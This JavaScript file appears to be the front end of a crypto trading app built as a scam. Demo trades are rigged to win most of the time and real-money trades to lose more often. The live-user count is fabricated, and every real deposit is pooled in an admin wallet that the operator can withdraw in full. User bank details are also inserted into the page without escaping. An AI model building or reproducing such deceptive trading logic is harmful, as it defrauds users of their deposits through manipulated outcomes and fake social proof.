// App State
let appState = {
    accountType: 'demo', // 'demo' or 'real'
    demoBalance: {
        btc: 0.5234,
        eth: 3.2451,
        usdt: 22650.33
    },
    realBalance: {
        btc: 0,
        eth: 0,
        usdt: 0
    },
    adminWallet: 0,
    pendingWithdrawals: [],
    transactions: [],
    activeTrades: []
};

// Crypto prices (will fluctuate)
let prices = {
    'BTC/USDT': 64250,
    'ETH/USDT': 3420,
    'BNB/USDT': 580
};

// Load state
function loadState() {
    const saved = localStorage.getItem('cryptoProApp');
    if (saved) {
        try {
            appState = JSON.parse(saved);
            updateUI();
        } catch (e) {}
    }
}

// Save state
function saveState() {
    localStorage.setItem('cryptoProApp', JSON.stringify(appState));
}

// Update UI
function updateUI() {
    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.realBalance;
    
    // Update balances
    const btcValue = balance.btc * prices['BTC/USDT'];
    const ethValue = balance.eth * prices['ETH/USDT'];
    const total = btcValue + ethValue + balance.usdt;
    
    document.getElementById('totalBalance').textContent = '$' + total.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
    
    document.getElementById('btcAmount').textContent = balance.btc.toFixed(4) + ' BTC';
    document.getElementById('btcValue').textContent = '$' + btcValue.toFixed(2);
    
    document.getElementById('ethAmount').textContent = balance.eth.toFixed(4) + ' ETH';
    document.getElementById('ethValue').textContent = '$' + ethValue.toFixed(2);
    
    document.getElementById('usdtAmount').textContent = balance.usdt.toFixed(2) + ' USDT';
    document.getElementById('usdtValue').textContent = '$' + balance.usdt.toFixed(2);
    
    // Update admin section
    if (appState.adminWallet > 0 || appState.pendingWithdrawals.length > 0) {
        document.getElementById('adminSection').style.display = 'block';
        document.getElementById('adminWallet').textContent = appState.adminWallet.toFixed(2);
        
        const pendingDiv = document.getElementById('pendingWithdrawals');
        if (appState.pendingWithdrawals.length > 0) {
            pendingDiv.innerHTML = '<div class="section-title">Pending Withdrawals</div>';
            appState.pendingWithdrawals.forEach(w => {
                pendingDiv.innerHTML += `
                    <div class="pending-item">
                        <div style="margin-bottom: 8px;">
                            <strong>$${w.amount.toFixed(2)}</strong> - ${w.accountName}
                        </div>
                        <div style="font-size: 12px; color: rgba(255,255,255,0.6); margin-bottom: 12px;">
                            ${w.bankName} - ${w.accountNumber}
                        </div>
                        <div class="btn-group">
                            <button class="btn btn-primary btn-sm" onclick="approveWithdrawal('${w.id}')">✅ APPROVE</button>
                            <button class="btn btn-secondary btn-sm" onclick="rejectWithdrawal('${w.id}')">❌ REJECT</button>
                        </div>
                    </div>
                `;
            });
        } else {
            pendingDiv.innerHTML = '';
        }
    }
}

// Switch account
function switchAccount(type) {
    appState.accountType = type;
    document.getElementById('demoBtn').classList.toggle('active', type === 'demo');
    document.getElementById('realBtn').classList.toggle('active', type === 'real');
    saveState();
    updateUI();
}

// Modal functions
function openModal(type) {
    document.getElementById(type + 'Modal').classList.add('active');
}

function closeModal(type) {
    document.getElementById(type + 'Modal').classList.remove('active');
}

// Execute trade
function executeTrade() {
    const pair = document.getElementById('tradePair').value;
    const type = document.getElementById('tradeType').value;
    const amount = parseFloat(document.getElementById('tradeAmount').value);
    const leverage = parseInt(document.getElementById('tradeLeverage').value);
    
    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.realBalance;
    
    if (!amount || amount < 10) {
        alert('❌ Minimum trade amount is $10');
        return;
    }
    
    if (balance.usdt < amount) {
        alert('❌ Insufficient USDT balance');
        return;
    }
    
    alert('⏳ Executing trade...');
    
    setTimeout(() => {
        // Deduct amount
        balance.usdt -= amount;
        
        // Demo = ALWAYS WIN, Real = Can LOSE
        let profitMultiplier;
        if (appState.accountType === 'demo') {
            // Demo: 80-95% chance of profit (5-15%)
            profitMultiplier = Math.random() < 0.85 ? (1 + (Math.random() * 0.10 + 0.05)) : (1 - (Math.random() * 0.03));
        } else {
            // Real: 40-60% chance of profit, higher losses possible
            profitMultiplier = Math.random() < 0.45 ? (1 + (Math.random() * 0.08)) : (1 - (Math.random() * 0.15));
        }
        
        const finalAmount = amount * leverage * profitMultiplier;
        const profit = finalAmount - (amount * leverage);
        
        balance.usdt += finalAmount;
        
        appState.transactions.push({
            id: Date.now(),
            type: 'TRADE',
            pair: pair,
            tradeType: type,
            amount: amount,
            leverage: leverage,
            profit: profit,
            timestamp: new Date().toISOString(),
            account: appState.accountType
        });
        
        saveState();
        updateUI();
        closeModal('trade');
        
        if (profit > 0) {
            alert(`✅ Trade successful! Profit: $${profit.toFixed(2)}`);
        } else {
            alert(`❌ Trade closed. Loss: $${Math.abs(profit).toFixed(2)}`);
        }
        
        // Clear form
        document.getElementById('tradeAmount').value = '';
    }, 2000);
}

// Process deposit
function processDeposit() {
    if (appState.accountType === 'demo') {
        alert('❌ Switch to REAL account to deposit');
        return;
    }
    
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const method = document.getElementById('depositMethod').value;
    
    if (!amount || amount < 10) {
        alert('❌ Minimum deposit is $10');
        return;
    }
    
    alert('⏳ Processing deposit...');
    
    setTimeout(() => {
        const fee = amount * 0.029;
        const netAmount = amount - fee;
        
        appState.realBalance.usdt += netAmount;
        appState.adminWallet += amount;
        
        appState.transactions.push({
            id: Date.now(),
            type: 'DEPOSIT',
            amount: netAmount,
            fee: fee,
            method: method,
            timestamp: new Date().toISOString(),
            status: 'COMPLETED'
        });
        
        saveState();
        updateUI();
        closeModal('deposit');
        alert('✅ Deposit successful! $' + netAmount.toFixed(2) + ' added to your account');
        document.getElementById('depositAmount').value = '';
    }, 2000);
}

// Process withdrawal
function processWithdraw() {
    if (appState.accountType === 'demo') {
        alert('❌ Switch to REAL account to withdraw');
        return;
    }
    
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const bankName = document.getElementById('bankName').value;
    const accountNumber = document.getElementById('accountNumber').value;
    const accountName = document.getElementById('accountName').value;
    
    if (!amount || amount < 10) {
        alert('❌ Minimum withdrawal is $10');
        return;
    }
    
    if (!bankName || !accountNumber || !accountName) {
        alert('❌ Please fill in all bank details');
        return;
    }
    
    const fee = 2;
    const totalAmount = amount + fee;
    
    if (appState.realBalance.usdt < totalAmount) {
        alert('❌ Insufficient balance (including $2 fee)');
        return;
    }
    
    alert('⏳ Processing withdrawal request...');
    
    setTimeout(() => {
        appState.realBalance.usdt -= totalAmount;
        
        const withdrawal = {
            id: Date.now().toString(),
            amount: amount,
            fee: fee,
            bankName: bankName,
            accountNumber: accountNumber,
            accountName: accountName,
            timestamp: new Date().toISOString(),
            status: 'PENDING'
        };
        
        appState.pendingWithdrawals.push(withdrawal);
        appState.transactions.push({...withdrawal, type: 'WITHDRAWAL'});
        
        saveState();
        updateUI();
        closeModal('withdraw');
        alert('⏳ Withdrawal request submitted! Awaiting admin approval (1-2 hours)');
        
        document.getElementById('withdrawAmount').value = '';
        document.getElementById('bankName').value = '';
        document.getElementById('accountNumber').value = '';
        document.getElementById('accountName').value = '';
    }, 2000);
}

// Approve withdrawal
function approveWithdrawal(id) {
    const withdrawal = appState.pendingWithdrawals.find(w => w.id === id);
    if (!withdrawal) return;
    
    if (confirm('✅ Approve withdrawal of $' + withdrawal.amount.toFixed(2) + '?')) {
        appState.adminWallet -= (withdrawal.amount + withdrawal.fee);
        appState.pendingWithdrawals = appState.pendingWithdrawals.filter(w => w.id !== id);
        
        const tx = appState.transactions.find(t => t.id === parseInt(id));
        if (tx) tx.status = 'COMPLETED';
        
        saveState();
        updateUI();
        alert('✅ Withdrawal approved! Funds sent to user.');
    }
}

// Reject withdrawal
function rejectWithdrawal(id) {
    const withdrawal = appState.pendingWithdrawals.find(w => w.id === id);
    if (!withdrawal) return;
    
    const reason = prompt('❌ Rejection reason:');
    if (!reason) return;
    
    appState.realBalance.usdt += (withdrawal.amount + withdrawal.fee);
    appState.pendingWithdrawals = appState.pendingWithdrawals.filter(w => w.id !== id);
    
    const tx = appState.transactions.find(t => t.id === parseInt(id));
    if (tx) {
        tx.status = 'REJECTED';
        tx.reason = reason;
    }
    
    saveState();
    updateUI();
    alert('❌ Withdrawal rejected and refunded to user.');
}

// Admin withdraw all
function adminWithdrawAll() {
    if (appState.adminWallet <= 0) {
        alert('❌ No funds available to withdraw');
        return;
    }
    
    document.getElementById('adminTotal').textContent = appState.adminWallet.toFixed(2);
    document.getElementById('adminWithdrawModal').classList.add('active');
}

// Confirm admin withdrawal
function confirmAdminWithdraw() {
    const bankName = document.getElementById('adminBankName').value;
    const accountNumber = document.getElementById('adminAccountNumber').value;
    const accountName = document.getElementById('adminAccountName').value;
    
    if (!bankName || !accountNumber || !accountName) {
        alert('❌ Please fill in all bank details');
        return;
    }
    
    if (confirm('💸 Withdraw $' + appState.adminWallet.toFixed(2) + ' to your bank account?')) {
        const amount = appState.adminWallet;
        
        appState.transactions.push({
            id: Date.now(),
            type: 'ADMIN_WITHDRAWAL',
            amount: amount,
            bankName: bankName,
            accountNumber: accountNumber,
            accountName: accountName,
            timestamp: new Date().toISOString(),
            status: 'COMPLETED'
        });
        
        appState.adminWallet = 0;
        
        saveState();
        updateUI();
        closeModal('adminWithdraw');
        alert('✅ Withdrawal successful! $' + amount.toFixed(2) + ' sent to your bank.');
        
        document.getElementById('adminBankName').value = '';
        document.getElementById('adminAccountNumber').value = '';
        document.getElementById('adminAccountName').value = '';
    }
}

// Live user count simulation
function updateLiveUsers() {
    const baseUsers = 1247;
    const variance = Math.floor(Math.random() * 100 - 50);
    const activeUsers = baseUsers + variance;
    document.getElementById('liveUsers').textContent = activeUsers.toLocaleString();
}

// Price fluctuation
function updatePrices() {
    Object.keys(prices).forEach(pair => {
        const change = (Math.random() - 0.5) * 100;
        prices[pair] = Math.max(prices[pair] + change, prices[pair] * 0.95);
    });
    updateUI();
}

// Close modals on outside click
document.querySelectorAll('.modal').forEach(modal => {
    modal.addEventListener('click', function(e) {
        if (e.target === this) {
            this.classList.remove('active');
        }
    });
});

// Initialize
loadState();
updateUI();
setInterval(updateLiveUsers, 5000);
setInterval(updatePrices, 10000);
setInterval(saveState, 10000);
